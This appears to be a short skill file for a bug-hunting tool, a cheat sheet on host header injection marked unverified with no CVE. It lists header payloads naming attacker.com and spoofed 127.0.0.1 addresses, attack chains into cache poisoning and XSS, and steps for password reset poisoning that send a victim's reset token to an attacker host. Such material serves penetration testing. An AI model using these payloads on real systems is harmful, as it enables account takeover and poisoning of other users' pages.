---
# bughive-repro-start
cve: null
repro: unverified
# bughive-repro-end
---

# SKILL: host-header-injection
## Payloads
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1
## Chains
- HHI → Web Cache Poisoning → Open Redirect
- HHI → Web Cache Poisoning → XSS
- HHI → Password Reset Poisoning
## Password Reset Poisoning
1. Forgot password, enter victim@x
2. Modify Host: attacker.com
3. Victim's link = https://attacker.com/reset?token=...
## Triage
Password reset poisoning → Critical. Cache poisoning → High.

<!-- bughive-repro-start -->
## Steps to reproduce

> Status: `repro: unverified` — no CVE was resolved for this skill. Nothing below was invented.

### What's missing
- no CVE/target in skill; needs teardown or stays unverified
<!-- bughive-repro-end -->
